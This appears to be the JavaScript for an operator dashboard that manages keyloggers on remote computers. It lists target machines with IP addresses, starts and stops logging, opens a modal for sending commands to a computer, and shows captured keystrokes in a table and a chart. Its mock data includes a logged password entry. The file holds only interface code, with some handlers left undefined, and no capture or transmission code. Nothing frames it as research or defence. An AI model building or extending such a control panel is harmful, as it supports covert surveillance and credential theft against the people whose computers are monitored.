// API Configuration
let API_URL = 'http://127.0.0.1:5000/api';

// Sidebar & Sections
const sidebarLinks = document.querySelectorAll('.nav a');
const sections = document.querySelectorAll('.section');

// Computers / Details
const computersContainer = document.getElementById('computers-container');
const computerDetailsSection = document.getElementById('computer-details');
const closeDetailsBtn = document.getElementById('close-details');
const detailName = document.getElementById('detail-name');
const detailId = document.getElementById('detail-id');
const detailIp = document.getElementById('detail-ip');
const keylogData = document.getElementById('keylog-data');
const systemInfo = document.getElementById('system-info');
const searchInput = document.getElementById('search-input');
const startLogging = document.getElementById('start-logging');
const stopLogging = document.getElementById('stop-logging');

// Modal: Send Command
const controlComputerBtn = document.getElementById('control-computer-btn');
const controlComputerModal = document.getElementById('control-computer-modal');
const sendCommandForm = document.getElementById('send-command-form');
const commandInput = document.getElementById('command-input');

// Modal: Add Computer
const addComputerBtn = document.getElementById('add-computer-btn');
const addComputerModal = document.getElementById('add-computer-modal');
const addComputerForm = document.getElementById('add-computer-form');
const newComputerNameInput = document.getElementById('new-computer-name');
const newComputerIpInput = document.getElementById('new-computer-ip');

// Close buttons (modals)
const modalCloseButtons = document.querySelectorAll('.modal-close, .modal-cancel');

// Dashboard
const totalComputersElem = document.getElementById('total-computers');
const activeKeyloggersElem = document.getElementById('active-keyloggers');
const lastCommandElem = document.getElementById('last-command');
let activityChart = null;

// Settings
const apiUrlInput = document.getElementById('api-url');
const authTokenInput = document.getElementById('auth-token');
const saveSettingsBtn = document.getElementById('save-settings-btn');

// Global Keylog
const globalLogContainer = document.getElementById('global-log-container');
const keylogTableBody = document.getElementById('keylog-table-body');

// State
let currentComputerId = null;
let computersData = [];

// Mock Data for testing UI before server data arrives
const mockKeylogData = [
  { timestamp: "2025-02-25 12:34:56", computer: "Computer A", log: "User typed: hello" },
  { timestamp: "2025-02-25 12:35:10", computer: "Computer A", log: "User pressed Enter" },
  { timestamp: "2025-02-25 12:36:05", computer: "Computer B", log: "User copied text" },
  { timestamp: "2025-02-25 12:37:20", computer: "Computer C", log: "User typed: password" },
  { timestamp: "2025-02-25 12:38:15", computer: "Computer A", log: "User clicked button" },
];

// Function to load mock data into the table
function loadMockData() {
  if (!keylogTableBody) {
    console.error("Error: keylog-table-body not found!");
    return;
  }

  keylogTableBody.innerHTML = '';

  if (mockKeylogData.length === 0) {
    const noDataRow = document.createElement('tr');
    noDataRow.innerHTML = `<td colspan="3" style="text-align: center;">No data available</td>`;
    keylogTableBody.appendChild(noDataRow);
    return;
  }

  mockKeylogData.forEach(entry => {
    const row = document.createElement('tr');
    row.innerHTML = `
            <td>${entry.timestamp}</td>
            <td>${entry.computer}</td>
            <td>${entry.log}</td>
        `;
    keylogTableBody.appendChild(row);
  });
}

// Initialize page content when DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  loadMockData();
  initNavLinks();
  setupEventListeners();
  initDashboardChart();
  printToConsole();
});

function printToConsole() {
  startLogging.addEventListener('click', () => {
    console.log('startLogging');
  });
  stopLogging.addEventListener('click', () => {
    console.log('stopLogging');
  });
}

// Navigation
function initNavLinks() {
  sidebarLinks.forEach(link => {
    link.addEventListener('click', event => {
      event.preventDefault();
      const sectionToShow = link.getAttribute('data-section');

      sections.forEach(s => s.classList.remove('active'));
      sidebarLinks.forEach(l => l.classList.remove('active'));

      document.getElementById(`${sectionToShow}-section`).classList.add('active');
      link.classList.add('active');
    });
  });
}

// Events
function setupEventListeners() {
  closeDetailsBtn.addEventListener('click', () => {
    computerDetailsSection.classList.add('hidden');
  });

  controlComputerBtn.addEventListener('click', () => openModal(controlComputerModal));

  addComputerBtn.addEventListener('click', () => openModal(addComputerModal));
  addComputerForm.addEventListener('submit', handleAddComputer);

  modalCloseButtons.forEach(button => {
    button.addEventListener('click', event => {
      const modal = event.target.closest('.modal-overlay');
      closeModal(modal);
    });
  });

  sendCommandForm.addEventListener('submit', handleSendCommand);
  searchInput.addEventListener('input', handleSearch);
  saveSettingsBtn.addEventListener('click', handleSaveSettings);
}

// Modal functions
function openModal(modal) {
  modal.classList.remove('hidden');
}
function closeModal(modal) {
  modal.classList.add('hidden');
}

// Settings
function handleSaveSettings() {
  if (apiUrlInput.value) {
    API_URL = apiUrlInput.value;
  }
  console.log('Settings saved. Current API:', API_URL);
}

// Chart
function initDashboardChart() {
  const ctx = document.getElementById('activityChart');
  if (!ctx) return;

  activityChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: [],
      datasets: [
        {
          label: 'Keylogger Activity',
          data: [],
          backgroundColor: '#ff1744',
        },
      ],
    },
    options: {
      responsive: true,
      scales: {
        y: { beginAtZero: true }
      },
    },
  });
}
